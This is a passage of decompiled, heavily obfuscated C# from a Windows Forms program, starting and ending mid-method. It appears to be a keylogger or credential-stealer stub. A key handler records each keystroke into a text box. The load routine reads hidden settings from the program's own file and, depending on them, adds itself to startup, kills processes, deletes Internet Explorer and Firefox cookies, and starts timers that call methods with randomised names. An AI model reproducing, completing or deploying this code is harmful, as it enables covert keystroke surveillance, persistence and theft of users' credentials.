            goto label_1522;
          }
label_1984:
          if ((uint) flag28 - (uint) flag28 >= 0U)
          {
            this.TextBox1.Text += "0";
            if (true)
            {
              if ((uint) flag28 >= 0U)
                goto label_1531;
              else
                goto label_1983;
            }
            else
              goto label_1163;
          }
          else
            goto label_1113;
label_1995:
          if (true)
            goto label_1984;
          else
            goto label_1518;
        }
        while ((uint) flag28 + (uint) flag28 < 0U);
        goto label_1994;
label_1975:
        flag2 = Key == Keys.D2;
        if (((flag1 ? 1 : 0) & 0) == 0)
        {
          if (!flag2)
          {
            if ((uint) flag1 - (uint) flag2 > uint.MaxValue)
              return;
          }
          else
            goto label_1973;
        }
        if (true)
          goto label_1970;
        else
          goto label_1977;
label_1531:
        return;
label_1522:
        return;
label_1518:
        return;
      }
label_1989:
      this.TextBox1.Text += "z";
      return;
label_1990:
      flag2 = Key == Keys.Z;
      if ((uint) flag2 < 0U)
        return;
      goto label_1987;
label_1994:
      if (Key != Keys.X)
      {
        flag2 = Key == Keys.Y;
        if (flag2)
        {
          this.TextBox1.Text += "y";
          if ((uint) flag2 >= 0U)
            return;
          goto label_1987;
        }
        else
          goto label_1990;
      }
      else
      {
        this.TextBox1.Text += "x";
        return;
      }
label_2009:
      flag2 = Key == Keys.V;
      if (((flag1 ? 1 : 0) & 0) == 0)
      {
        if ((uint) flag2 >= 0U)
        {
          while (!flag2)
          {
            flag2 = Key == Keys.W;
            if ((uint) flag2 - (uint) flag2 >= 0U)
              goto label_1999;
          }
          goto label_2005;
label_1999:
          if ((uint) flag1 + (uint) flag1 >= 0U)
          {
            if ((uint) flag1 - (uint) flag1 >= 0U)
            {
              if (flag2)
              {
                this.TextBox1.Text += "w";
                return;
              }
              goto label_1994;
            }
            else
              goto label_470;
          }
          else
            goto label_387;
label_2005:
          this.TextBox1.Text += "v";
          if ((uint) flag2 - (uint) flag2 >= 0U)
            return;
          goto label_1999;
        }
        else
          goto label_1624;
      }
label_2010:
      if ((uint) flag1 + (uint) flag1 < 0U)
        return;
label_2011:
      if (!flag2)
      {
        if ((uint) flag2 > uint.MaxValue)
          goto label_1586;
        else
          goto label_2009;
      }
      else
      {
        this.TextBox1.Text += "u";
        if ((uint) flag2 + (uint) flag1 >= 0U)
          return;
      }
label_2018:
      if (((flag1 ? 1 : 0) | 1) == 0)
        return;
      goto label_2010;
label_2020:
      flag2 = Key == Keys.U;
      if (true)
      {
        if (false)
          goto label_99;
        else
          goto label_2011;
      }
      else
        goto label_2010;
label_2024:
      this.TextBox1.Text += "t";
      return;
label_2026:
      flag2 = Key == Keys.T;
label_2027:
      if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
      {
        if (flag2)
          goto label_2024;
        else
          goto label_2020;
      }
      else if (true)
      {
        if ((uint) flag1 + (uint) flag1 < 0U || ((flag1 ? 1 : 0) & 0) == 0)
          goto label_2039;
        else
          goto label_514;
      }
      else
        goto label_1570;
label_2036:
      if (true)
      {
        if (flag2)
        {
          this.TextBox1.Text += "s";
          if ((uint) flag1 - (uint) flag1 <= uint.MaxValue)
          {
            if ((uint) flag2 + (uint) flag1 <= uint.MaxValue)
              return;
          }
          else
            goto label_2049;
        }
        else
          goto label_2026;
      }
      else
        goto label_564;
label_2039:
      if ((uint) flag1 - (uint) flag2 >= 0U)
      {
        if (false)
        {
          if (true)
            goto label_2009;
          else
            goto label_2018;
        }
        else
          goto label_2024;
      }
      else
        goto label_1994;
label_2043:
      if (!flag2)
      {
        flag2 = Key == Keys.S;
        goto label_2036;
      }
      else
      {
        this.TextBox1.Text += "r";
        if ((uint) flag1 - (uint) flag1 <= uint.MaxValue)
          return;
        goto label_2047;
      }
label_2046:
      flag2 = Key == Keys.R;
      goto label_2043;
label_2047:
      if ((uint) flag1 - (uint) flag1 <= uint.MaxValue)
        goto label_2046;
label_2049:
      if (!flag2)
      {
        if ((uint) flag1 + (uint) flag1 > uint.MaxValue)
          goto label_867;
        else
          goto label_2046;
      }
label_2056:
      this.TextBox1.Text += "q";
      if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
        return;
      goto label_2047;
label_2059:
      if (!flag2)
      {
        if ((uint) flag2 >= 0U)
        {
          flag2 = Key == Keys.Q;
          goto label_2049;
        }
        else
          goto label_2056;
      }
label_2063:
      this.TextBox1.Text += "p";
      return;
label_2064:
      if (flag2)
      {
        this.TextBox1.Text += "o";
        return;
      }
label_2065:
      flag2 = Key == Keys.P;
      goto label_2059;
label_2067:
      flag2 = Key == Keys.O;
      goto label_2064;
label_2070:
      flag2 = Key == Keys.N;
label_2071:
      if (flag2)
      {
        this.TextBox1.Text += "n";
        if ((uint) flag2 + (uint) flag2 <= uint.MaxValue)
        {
          if (true)
            return;
          goto label_1121;
        }
      }
      else
        goto label_2067;
label_2073:
      if ((uint) flag2 <= uint.MaxValue)
      {
        this.TextBox1.Text += "m";
        return;
      }
      goto label_625;
label_2080:
      if (flag2)
      {
        this.TextBox1.Text += "l";
        return;
      }
      if (((flag1 ? 1 : 0) & 0) == 0)
        flag2 = Key == Keys.M;
      if ((uint) flag1 <= uint.MaxValue)
      {
        if ((uint) flag1 + (uint) flag1 >= 0U)
        {
          if (!flag2)
            goto label_2070;
        }
        else
          goto label_985;
      }
      if ((uint) flag2 - (uint) flag2 < 0U)
      {
        if (((flag1 ? 1 : 0) | int.MinValue) == 0)
        {
          if (true)
            goto label_2064;
          else
            goto label_2063;
        }
        else
          goto label_2067;
      }
      else
        goto label_2073;
label_2095:
      if (true)
      {
        if (!flag2)
        {
          if (((flag2 ? 1 : 0) & 0) == 0)
          {
            flag2 = Key == Keys.L;
            if ((uint) flag1 + (uint) flag2 >= 0U || (uint) flag1 - (uint) flag2 <= uint.MaxValue)
              goto label_2080;
            else
              goto label_1326;
          }
          else
            goto label_496;
        }
      }
      else
        goto label_65;
label_2097:
      this.TextBox1.Text += "k";
      return;
label_2098:
      flag2 = Key == Keys.K;
      if (false)
        return;
      goto label_2095;
label_2106:
      this.TextBox1.Text += "j";
      return;
label_2108:
      if (flag2)
      {
        this.TextBox1.Text += "i";
        return;
      }
label_2109:
      if (Key == Keys.J)
        goto label_2106;
      else
        goto label_2098;
label_2118:
      do
      {
        flag2 = Key == Keys.H;
        if ((uint) flag2 + (uint) flag2 <= uint.MaxValue)
        {
          while (!flag2)
          {
label_2113:
            flag2 = Key == Keys.I;
            if ((uint) flag2 > uint.MaxValue)
            {
              if ((uint) flag2 - (uint) flag2 < 0U)
                goto label_2113;
            }
            else
              goto label_2108;
          }
          this.TextBox1.Text += "h";
        }
        else
          goto label_196;
      }
      while ((uint) flag2 - (uint) flag2 < 0U);
      return;
label_2124:
      if (Key == Keys.G)
      {
        this.TextBox1.Text += "g";
        return;
      }
      goto label_2118;
label_2150:
      if ((uint) flag2 + (uint) flag2 > uint.MaxValue)
        goto label_2153;
label_2151:
      flag2 = Key == Keys.D;
      if (true)
      {
        if (!flag2)
        {
          flag2 = Key == Keys.E;
          if (!flag2)
          {
            bool flag29 = Key == Keys.F;
            if ((uint) flag29 - (uint) flag1 >= 0U)
            {
              if (!flag29)
                goto label_2124;
            }
            else if ((uint) flag29 > uint.MaxValue)
              goto label_1970;
            this.TextBox1.Text += "f";
            return;
          }
          if ((uint) flag2 >= 0U)
            goto label_2136;
label_2135:
          this.TextBox1.Text += "e";
          if ((uint) flag1 - (uint) flag2 <= uint.MaxValue)
            return;
          if (((flag1 ? 1 : 0) | 3) != 0)
            goto label_2158;
          else
            goto label_2150;
label_2136:
          if ((uint) flag2 + (uint) flag2 >= 0U)
          {
            if (false)
              goto label_2153;
            else
              goto label_2135;
          }
          else
            goto label_843;
        }
        else
        {
          this.TextBox1.Text += "d";
          if (false)
            ;
          return;
        }
      }
label_2158:
      if ((uint) flag1 - (uint) flag2 < 0U)
      {
        if (((flag2 ? 1 : 0) & 0) == 0)
          goto label_2098;
        else
          goto label_2036;
      }
      else
        goto label_2118;
label_2153:
      if ((uint) flag2 <= uint.MaxValue)
      {
        if (((flag2 ? 1 : 0) & 0) == 0)
        {
          if ((uint) flag1 + (uint) flag2 > uint.MaxValue)
            goto label_274;
          else
            goto label_2151;
        }
        else
          goto label_581;
      }
label_2155:
      if (flag2)
      {
        this.TextBox1.Text += "c";
        return;
      }
      goto label_2150;
label_2163:
      if (false)
        return;
      bool flag30 = Key == Keys.A;
      if (!flag30)
      {
        if (Key != Keys.B)
        {
          flag2 = Key == Keys.C;
          if ((uint) flag2 + (uint) flag1 > uint.MaxValue)
            goto label_2106;
          else
            goto label_2155;
        }
        else
        {
          this.TextBox1.Text += "b";
          if (false)
            goto label_961;
        }
      }
      else
      {
        this.TextBox1.Text += "a";
        if ((uint) flag30 + (uint) flag30 < 0U)
          goto label_434;
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
label_1:
      int num1;
      int num2;
      try
      {
        int num3 = 1;
        if ((uint) num1 + (uint) num1 >= 0U)
          goto label_262;
        else
          goto label_166;
label_3:
        int num4;
        switch (num4)
        {
          case 0:
            goto label_267;
          case 1:
            int num5 = num1 + 1;
            num1 = 0;
            switch (num5)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_261;
              case 3:
                goto label_258;
              case 4:
                goto label_257;
              case 5:
                goto label_255;
              case 6:
                goto label_253;
              case 7:
                goto label_252;
              case 8:
                goto label_249;
              case 9:
                goto label_247;
              case 10:
                goto label_244;
              case 11:
                goto label_245;
              case 12:
                goto label_240;
              case 13:
                goto label_237;
              case 14:
                goto label_234;
              case 15:
                goto label_233;
              case 16:
                goto label_229;
              case 17:
                goto label_226;
              case 18:
                goto label_223;
              case 19:
                goto label_218;
              case 20:
                goto label_220;
              case 21:
                goto label_211;
              case 22:
                goto label_208;
              case 23:
                goto label_206;
              case 24:
                goto label_201;
              case 25:
                goto label_198;
              case 26:
                goto label_194;
              case 27:
                goto label_191;
              case 28:
                goto label_189;
              case 29:
                goto label_187;
              case 30:
                goto label_184;
              case 31:
                goto label_182;
              case 32:
                goto label_178;
              case 33:
                goto label_177;
              case 34:
                goto label_174;
              case 35:
                goto label_172;
              case 36:
                goto label_166;
              case 37:
                goto label_163;
              case 38:
                goto label_162;
              case 39:
                goto label_161;
              case 40:
                goto label_154;
              case 41:
                goto label_153;
              case 42:
              case 45:
                goto label_143;
              case 43:
                goto label_149;
              case 44:
                goto label_148;
              case 46:
                goto label_144;
              case 47:
              case 50:
                goto label_137;
              case 48:
                goto label_141;
              case 49:
                goto label_139;
              case 51:
                goto label_136;
              case 52:
              case 55:
              case 56:
                goto label_114;
              case 53:
                goto label_124;
              case 54:
                goto label_123;
              case 57:
              case 60:
                goto label_117;
              case 58:
                goto label_112;
              case 59:
                goto label_110;
              case 61:
                goto label_105;
              case 62:
              case 65:
                goto label_94;
              case 63:
                goto label_103;
              case 64:
                goto label_100;
              case 66:
                goto label_95;
              case 67:
              case 70:
                goto label_87;
              case 68:
                goto label_90;
              case 69:
                goto label_91;
              case 71:
                goto label_86;
              case 72:
              case 75:
              case 76:
                goto label_80;
              case 73:
                goto label_85;
              case 74:
                goto label_84;
              case 77:
              case 81:
                goto label_67;
              case 78:
                goto label_75;
              case 79:
                goto label_72;
              case 80:
                goto label_71;
              case 82:
                goto label_69;
              case 83:
              case 86:
                goto label_59;
              case 84:
                goto label_66;
              case 85:
                goto label_64;
              case 87:
                goto label_60;
              case 88:
              case 96:
                goto label_36;
              case 89:
                goto label_54;
              case 90:
                goto label_53;
              case 91:
                goto label_50;
              case 92:
                goto label_47;
              case 93:
                goto label_48;
              case 94:
                goto label_42;
              case 95:
                goto label_41;
              case 97:
                goto label_37;
              case 98:
              case 101:
              case 102:
                goto label_26;
              case 99:
                goto label_32;
              case 100:
                goto label_30;
              case 103:
              case 106:
              case 107:
                goto label_19;
              case 104:
                goto label_21;
              case 105:
                goto label_22;
              case 108:
                goto label_16;
              case 109:
                goto label_11;
              case 110:
                goto label_266;
              default:
                goto label_267;
            }
        }
label_4:
        if ((num2 & 0) == 0)
        {
          if ((uint) num3 + (uint) num3 <= uint.MaxValue)
          {
            if (true)
            {
              if ((num1 & 0) == 0)
              {
                if ((uint) num2 <= uint.MaxValue)
                  goto label_267;
                else
                  goto label_42;
              }
              else
                goto label_24;
            }
          }
          else
            goto label_164;
        }
        else
          goto label_121;
label_7:
        num4 = 1;
        goto label_3;
label_8:
        num1 = num3;
        if ((uint) num3 <= uint.MaxValue && num2 > -2)
        {
          num4 = num2;
          goto label_3;
        }
        else
          goto label_7;
label_11:
        num3 = 109;
label_12:
        this.Timer1.Start();
        goto label_15;
label_14:
        bool flag;
        if (((flag ? 1 : 0) | int.MinValue) == 0)
          goto label_219;
        else
          goto label_11;
label_15:
        if ((uint) num2 >= 0U)
        {
          if ((uint) num3 > uint.MaxValue)
            goto label_256;
          else
            goto label_266;
        }
        else
          goto label_8;
label_16:
        num3 = 108;
        if ((uint) num2 + (uint) num3 >= 0U)
        {
          if (true)
          {
            this.Timer1.Interval = Conversions.ToInteger(this.TextBox4.Text);
            goto label_14;
          }
          else
            goto label_19;
        }
label_17:
        this.TextBox4.Text = Conversions.ToString(Convert.ToInt32(this.options[3]));
        if ((uint) num3 < 0U)
          goto label_266;
        else
          goto label_16;
label_19:
        num3 = 107;
        if ((uint) num2 - (uint) flag > uint.MaxValue)
          goto label_212;
        else
          goto label_17;
label_21:
        num3 = 104;
label_22:
        num3 = 105;
        this.Timer8.Start();
        if (true)
        {
          if ((uint) num1 <= uint.MaxValue)
            goto label_19;
          else
            goto label_21;
        }
        else
          goto label_174;
label_24:
        if ((num3 | -1) == 0)
          goto label_136;
        else
          goto label_21;
label_25:
        if (flag)
          goto label_19;
        else
          goto label_24;
label_26:
        num3 = 102;
        flag = !Conversions.ToBoolean(this.options[15]);
        goto label_25;
label_28:
        if ((uint) num3 + (uint) flag > uint.MaxValue)
          goto label_19;
        else
          goto label_26;
label_29:
        this.Timer7.Start();
        if (((flag ? 1 : 0) | 8) != 0)
        {
          if ((uint) num2 + (uint) num3 >= 0U)
            goto label_28;
          else
            goto label_26;
        }
        else
          goto label_42;
label_30:
        num3 = 100;
        goto label_29;
label_32:
        num3 = 99;
        goto label_35;
label_33:
        if (!flag)
        {
          if (false)
            goto label_137;
          else
            goto label_32;
        }
        else
          goto label_26;
label_35:
        if ((num3 & 0) == 0)
          goto label_30;
        else
          goto label_29;
label_36:
label_37:
        num3 = 97;
        flag = !Conversions.ToBoolean(this.options[14]);
        if ((uint) num1 + (uint) num2 >= 0U)
        {
          if ((uint) num2 + (uint) flag <= uint.MaxValue)
            goto label_33;
          else
            goto label_35;
        }
        else
          goto label_66;
label_40:
        if ((uint) num1 >= 0U)
        {
          if ((uint) flag >= 0U)
          {
            if (true)
              goto label_36;
            else
              goto label_42;
          }
          else
            goto label_96;
        }
        else
          goto label_42;
label_41:
        num3 = 95;
        this.DeleteMozillaCookies(true);
        if ((uint) num2 + (uint) num2 >= 0U)
          goto label_40;
label_42:
        ProjectData.ClearProjectError();
        num2 = -4;
        if ((uint) flag > uint.MaxValue)
          goto label_58;
        else
          goto label_41;
label_46:
        this.DeleteIECookies(true);
        if ((uint) num2 + (uint) flag <= uint.MaxValue)
        {
          if (true)
          {
            if (false)
              goto label_55;
            else
              goto label_42;
          }
          else
            goto label_4;
        }
        else
          goto label_42;
label_47:
        ProjectData.ClearProjectError();
        num2 = -3;
label_48:
        num3 = 93;
        if ((uint) num1 >= 0U)
          goto label_46;
        else
          goto label_54;
label_49:
        this.KillProcesses(true, true);
        goto label_47;
label_50:
        num3 = 91;
        if ((uint) num2 >= 0U)
        {
          if ((uint) flag - (uint) num2 <= uint.MaxValue)
          {
            if (true)
              goto label_49;
            else
              goto label_47;
          }
          else
            goto label_19;
        }
        else
          goto label_246;
label_53:
        ProjectData.ClearProjectError();
        num2 = -2;
        goto label_50;
label_54:
        num3 = 89;
        goto label_53;
label_55:
        if (flag)
        {
          if ((uint) num1 + (uint) flag < 0U)
            goto label_187;
          else
            goto label_36;
        }
        else
          goto label_54;
label_58:
        flag = !Conversions.ToBoolean(this.options[13]);
        goto label_55;
label_59:
label_60:
        num3 = 87;
        if ((uint) flag <= uint.MaxValue)
          goto label_65;
label_61:
        if ((uint) num2 - (uint) num1 >= 0U)
        {
          if ((num2 | 15) != 0)
          {
            if ((uint) flag + (uint) num2 <= uint.MaxValue)
              goto label_59;
            else
              goto label_65;
          }
          else
            goto label_209;
        }
        else
          goto label_167;
label_64:
        num3 = 85;
        this.Timer6.Start();
        if ((uint) num3 - (uint) num1 >= 0U)
          goto label_61;
label_65:
        if ((num3 | 2) != 0)
        {
          if (false)
            goto label_28;
          else
            goto label_58;
        }
        else
          goto label_67;
label_66:
        num3 = 84;
        if ((uint) num2 - (uint) flag > uint.MaxValue)
          goto label_179;
        else
          goto label_64;
label_67:
label_68:
        if ((uint) num2 < 0U)
          goto label_41;
label_69:
        num3 = 82;
        flag = !Conversions.ToBoolean(this.options[12]);
        if (flag)
          goto label_59;
        else
          goto label_66;
label_71:
        num3 = 80;
        if ((num3 & 0) == 0)
        {
          this.askfuh129836jsa();
          goto label_67;
        }
        else
          goto label_30;
label_72:
        num3 = 79;
        this.IKjsd2933214j1();
        goto label_71;
label_75:
        num3 = 78;
        if ((uint) flag - (uint) num1 >= 0U)
        {
          if ((uint) num3 <= uint.MaxValue)
          {
            if ((uint) num2 - (uint) num1 >= 0U)
            {
              if ((uint) num1 + (uint) num3 <= uint.MaxValue)
                ;
              if ((uint) num1 <= uint.MaxValue)
                goto label_72;
              else
                goto label_67;
            }
            else
              goto label_208;
          }
          else
            goto label_82;
        }
        else
          goto label_146;
label_80:
        num3 = 76;
        if (true)
        {
          flag = !Conversions.ToBoolean(this.options[11]);
          if (flag)
          {
            if ((uint) num2 - (uint) flag < 0U)
              goto label_81;
          }
          else
            goto label_75;
        }
        if ((num2 & 0) == 0)
          goto label_67;
        else
          goto label_84;
label_81:
        this.lud283aH2082bca2G32SDV();
label_82:
        goto label_80;
label_84:
        num3 = 74;
        goto label_81;
label_85:
        num3 = 73;
        goto label_84;
label_86:
        num3 = 71;
        flag = !Conversions.ToBoolean(this.options[10]);
        if (!flag)
          goto label_85;
        else
          goto label_80;
label_87:
        if ((num2 | 8) != 0)
        {
          if ((num1 & 0) == 0)
            goto label_86;
          else
            goto label_84;
        }
        else
          goto label_258;
label_90:
        num3 = 68;
label_91:
        num3 = 69;
        if ((uint) num1 + (uint) num1 <= uint.MaxValue)
          this.KDDhsgd23943173GAJgf239047dsjkg();
        if ((uint) num1 + (uint) num3 <= uint.MaxValue)
          goto label_87;
        else
          goto label_84;
label_94:
label_95:
        num3 = 66;
label_96:
        if ((uint) flag - (uint) num3 >= 0U)
        {
          flag = !Conversions.ToBoolean(this.options[9]);
          if (flag)
            goto label_87;
          else
            goto label_118;
        }
        else
          goto label_94;
label_99:
label_100:
        num3 = 64;
        if ((uint) num2 + (uint) num2 >= 0U)
        {
          if (((flag ? 1 : 0) & 0) == 0)
          {
            this.ujks27DFHJKkjhga129374HGFDAKJHGASD8723GFhdagsjegf2173();
            if ((uint) num2 - (uint) num1 >= 0U)
            {
              if ((uint) num1 - (uint) flag <= uint.MaxValue)
                goto label_94;
            }
            else
              goto label_107;
          }
          else
            goto label_94;
        }
        else
          goto label_111;
label_101:
        if (!flag)
        {
          if (false)
            goto label_14;
        }
        else
          goto label_94;
label_103:
        num3 = 63;
        goto label_99;
label_105:
        num3 = 61;
        flag = !Conversions.ToBoolean(this.options[8]);
        if ((uint) flag - (uint) num3 < 0U)
          goto label_124;
        else
          goto label_101;
label_107:
        this.TNLgi4bBsY();
        goto label_117;
label_110:
        num3 = 59;
        goto label_113;
label_111:
        if (flag)
          goto label_117;
label_112:
        num3 = 58;
        if ((num1 & 0) == 0)
        {
          if ((uint) flag >= 0U)
          {
            if (false)
              goto label_115;
            else
              goto label_110;
          }
          else
            goto label_136;
        }
label_113:
        if (true)
        {
          if ((uint) num1 >= 0U)
          {
            if (((flag ? 1 : 0) & 0) != 0)
              goto label_182;
            else
              goto label_107;
          }
          else
            goto label_117;
        }
label_114:
        num3 = 56;
label_115:
        flag = !Conversions.ToBoolean(this.options[7]);
        goto label_111;
label_117:
        if ((uint) flag - (uint) num1 <= uint.MaxValue)
          goto label_105;
label_118:
        if (((flag ? 1 : 0) | 2) == 0)
        {
          if ((uint) num2 - (uint) num1 < 0U)
          {
            if (true)
              goto label_124;
          }
          else
            goto label_137;
        }
        else
          goto label_90;
label_121:
        this.Timer4.Start();
        if ((uint) num1 - (uint) num1 >= 0U)
        {
          if ((uint) num1 - (uint) num1 >= 0U)
            goto label_114;
          else
            goto label_137;
        }
        else
          goto label_124;
label_123:
        num3 = 54;
        goto label_121;
label_124:
        num3 = 53;
        if ((uint) num3 - (uint) flag <= uint.MaxValue)
        {
          if (((flag ? 1 : 0) & 0) != 0)
            goto label_26;
          else
            goto label_123;
        }
        else
          goto label_121;
label_128:
        if (!flag)
        {
          if ((uint) flag + (uint) num3 <= uint.MaxValue)
          {
            if ((uint) num1 >= 0U)
            {
              if ((uint) num1 >= 0U)
              {
                if ((num3 | int.MinValue) != 0)
                  goto label_124;
              }
              else
                goto label_99;
            }
            else
              goto label_49;
          }
          else
            goto label_186;
        }
        else
          goto label_114;
label_132:
        if ((uint) num1 > uint.MaxValue)
          goto label_8;
        else
          goto label_114;
label_136:
        do
        {
          num3 = 51;
          if (true)
          {
            flag = !Conversions.ToBoolean(this.options[6]);
            if ((uint) num1 + (uint) num2 > uint.MaxValue)
            {
              if ((uint) flag + (uint) flag > uint.MaxValue)
                goto label_189;
            }
            else
              goto label_128;
          }
          else
            break;
        }
        while ((uint) num1 - (uint) num2 < 0U);
        goto label_132;
label_137:
        if (true)
          goto label_136;
        else
          goto label_132;
label_139:
        num3 = 49;
        if (true)
        {
          Form1.AddStartup(this.Text, Application.ExecutablePath);
          goto label_137;
        }
        else
          goto label_25;
label_141:
        num3 = 48;
        goto label_139;
label_143:
label_144:
        num3 = 46;
        if ((uint) num1 + (uint) num3 <= uint.MaxValue)
        {
          flag = !Conversions.ToBoolean(this.options[5]);
          if (true)
          {
            if (flag)
              goto label_137;
            else
              goto label_141;
          }
          else if ((uint) num1 - (uint) flag >= 0U)
            goto label_137;
          else
            goto label_166;
        }
        else
          goto label_128;
label_146:
        if ((uint) flag + (uint) num3 >= 0U)
        {
          if (false)
            goto label_25;
        }
        else
          goto label_263;
label_148:
        num3 = 44;
        this.Timer3.Start();
        goto label_143;
label_149:
        num3 = 43;
        goto label_146;
label_153:
        num3 = 41;
        if ((uint) num3 <= uint.MaxValue)
        {
          if ((uint) flag >= 0U)
          {
            flag = !Conversions.ToBoolean(this.options[4]);
            if (!flag)
            {
              if ((uint) num2 + (uint) num2 > uint.MaxValue)
                goto label_46;
              else
                goto label_149;
            }
            else
              goto label_143;
          }
          else
            goto label_53;
        }
        else
          goto label_68;
label_154:
        num3 = 40;
        this.TextBox7.Text = this.options[13];
        goto label_153;
label_158:
        if (((flag ? 1 : 0) & 0) == 0)
        {
          if ((uint) flag - (uint) num2 >= 0U)
          {
            if ((uint) num2 >= 0U)
            {
              if ((uint) num1 <= uint.MaxValue)
              {
                this.TextBox4.Text = this.options[3];
                goto label_154;
              }
              else
                goto label_210;
            }
            else
              goto label_226;
          }
          else
            goto label_153;
        }
        else
          goto label_223;
label_161:
        num3 = 39;
        goto label_158;
label_162:
        num3 = 38;
        this.TextBox3.Text = this.options[2];
        goto label_168;
label_163:
        num3 = 37;
label_164:
        this.TextBox2.Text = this.options[1];
        goto label_167;
label_166:
        num3 = 36;
        if ((num3 | -1) != 0)
        {
          this.options = Strings.Split(this.nie9zcYPUv, string.Intern(x1110bdd110cdcea4._xaacba899487bce8c("ahlcehcdcjjdpjaeejheffoecfffehmfdgdgogkgffbhpeih", 1505700656)));
          goto label_163;
        }
        else
          goto label_33;
label_167:
        if (((flag ? 1 : 0) | int.MinValue) != 0)
          goto label_162;
label_168:
        if (true)
        {
          if ((uint) flag - (uint) flag > uint.MaxValue)
            goto label_212;
          else
            goto label_161;
        }
        else
          goto label_158;
label_172:
        int[] numArray;
        do
        {
          num3 = 35;
          numArray = new int[1];
          if ((uint) num1 + (uint) num3 >= 0U)
          {
            if (((flag ? 1 : 0) & 0) == 0)
            {
              numArray[0] = 1;
              if ((uint) flag + (uint) flag < 0U)
                ;
            }
            else
              goto label_114;
          }
        }
        while (false);
        FileSystem.FileClose(numArray);
        if (false)
        {
          if ((uint) flag + (uint) num3 >= 0U)
            goto label_196;
          else
            goto label_176;
        }
        else
          goto label_166;
label_174:
        num3 = 34;
        FileSystem.FileGet(1, ref this.HReXgzZX4q);
        goto label_172;
label_176:
        FileSystem.FileGet(1, ref this.FLs3dYBgcK);
        goto label_174;
label_177:
        num3 = 33;
        if (((flag ? 1 : 0) & 0) == 0)
        {
          if ((uint) flag + (uint) num1 >= 0U)
            goto label_176;
          else
            goto label_183;
        }
        else
          goto label_180;
label_178:
        num3 = 32;
label_179:
        FileSystem.FileGet(1, ref this.Hoce22GrYR);
        if ((num2 & 0) == 0)
          goto label_177;
label_180:
        FileSystem.FileGet(1, ref this.xUXee9fLsc);
        if ((uint) flag > uint.MaxValue)
          goto label_143;
        else
          goto label_178;
label_182:
        num3 = 31;
        goto label_180;
label_183:
        FileSystem.FileGet(1, ref this.u1ISb2tL71);
        if (false)
          goto label_95;
        else
          goto label_182;
label_184:
        num3 = 30;
        if ((uint) num2 + (uint) num3 > uint.MaxValue)
          goto label_182;
        else
          goto label_183;
label_186:
        if ((uint) num3 < 0U)
          goto label_15;
label_187:
        num3 = 29;
        if ((uint) num3 + (uint) num1 <= uint.MaxValue)
          FileSystem.FileGet(1, ref this.RK8mvhFc0D);
        if (true)
          goto label_184;
        else
          goto label_191;
label_188:
        if ((uint) num1 < 0U)
          goto label_210;
label_189:
        num3 = 28;
        FileSystem.FileGet(1, ref this.Jje3WLD2TX);
        if ((uint) num1 - (uint) num2 >= 0U)
          goto label_186;
        else
          goto label_188;
label_191:
        num3 = 27;
        if (true)
        {
          FileSystem.FileGet(1, ref this.TXPYU9ol9I);
          goto label_188;
        }
        else
          goto label_90;
label_194:
        num3 = 26;
        FileSystem.FileGet(1, ref this.BIYaksaUXR);
        if (true)
        {
          if ((uint) flag <= uint.MaxValue)
          {
            if ((num1 & 0) == 0)
              goto label_191;
            else
              goto label_176;
          }
          else
            goto label_40;
        }
        else
          goto label_247;
label_196:
        FileSystem.FileGet(1, ref this.fazEqHLo8Y);
        while ((uint) num1 + (uint) num3 < 0U)
          ;
        goto label_194;
label_198:
        num3 = 25;
        goto label_222;
label_201:
        num3 = 24;
        if ((uint) num1 - (uint) num1 >= 0U)
          FileSystem.FileGet(1, ref this.n01ypBQrhK);
        if ((uint) num1 - (uint) num1 >= 0U)
          goto label_198;
        else
          goto label_222;
label_206:
        num3 = 23;
        if ((uint) num1 + (uint) num3 >= 0U)
        {
          FileSystem.FileGet(1, ref this.b4d8hOGWIz);
          if ((num3 | (int) byte.MaxValue) == 0)
          {
            if ((uint) num3 > uint.MaxValue)
              goto label_139;
            else
              goto label_128;
          }
          else if ((uint) num2 <= uint.MaxValue)
          {
            if (false)
              goto label_12;
            else
              goto label_201;
          }
          else
            goto label_29;
        }
        else
          goto label_67;
label_207:
        if ((num3 & 0) == 0)
        {
          if ((uint) flag + (uint) num1 >= 0U)
          {
            if ((uint) flag < 0U)
              goto label_163;
            else
              goto label_206;
          }
          else
            goto label_222;
        }
        else
          goto label_215;
label_208:
        num3 = 22;
label_209:
        FileSystem.FileGet(1, ref this.CMoPfL3l2I);
        goto label_207;
label_210:
        if ((uint) num3 < 0U)
          goto label_217;
label_211:
        num3 = 21;
label_212:
        FileSystem.FileGet(1, ref this.zNYN2apmvZ);
        if (true)
          ;
        if (true)
          goto label_208;
        else
          goto label_207;
label_215:
        if (true)
        {
          if ((uint) num1 - (uint) flag < 0U)
            goto label_26;
          else
            goto label_210;
        }
label_217:
        FileSystem.FileGet(1, ref this.nie9zcYPUv);
        goto label_215;
label_218:
        num3 = 19;
label_219:
        this.HReXgzZX4q = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_220:
        num3 = 20;
        if ((uint) num3 >= 0U)
          goto label_217;
label_221:
        this.FLs3dYBgcK = Strings.Space(checked ((int) FileSystem.LOF(1)));
        goto label_218;
label_222:
        if ((uint) num1 - (uint) num3 >= 0U)
          goto label_196;
label_223:
        num3 = 18;
        goto label_221;
label_225:
        this.xUXee9fLsc = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_226:
        num3 = 17;
        if (true)
        {
          this.Hoce22GrYR = Strings.Space(checked ((int) FileSystem.LOF(1)));
          goto label_241;
        }
        else
          goto label_253;
label_229:
        num3 = 16;
        if ((uint) num2 + (uint) num2 > uint.MaxValue)
        {
          if ((uint) num2 + (uint) flag <= uint.MaxValue)
            goto label_232;
        }
        else if ((uint) num1 + (uint) flag >= 0U)
        {
          if ((uint) flag + (uint) num3 <= uint.MaxValue)
          {
            if ((uint) num3 + (uint) flag < 0U)
              goto label_90;
            else
              goto label_225;
          }
          else
            goto label_107;
        }
        else
          goto label_241;
label_231:
        this.u1ISb2tL71 = Strings.Space(checked ((int) FileSystem.LOF(1)));
        if ((uint) num2 <= uint.MaxValue)
          goto label_229;
label_232:
        this.RK8mvhFc0D = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_233:
        num3 = 15;
        if ((uint) num1 + (uint) num1 < 0U)
          goto label_139;
        else
          goto label_231;
label_234:
        num3 = 14;
        if ((uint) flag >= 0U)
        {
          if ((uint) num3 >= 0U)
            goto label_232;
        }
        else
          goto label_42;
label_236:
        this.TXPYU9ol9I = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_237:
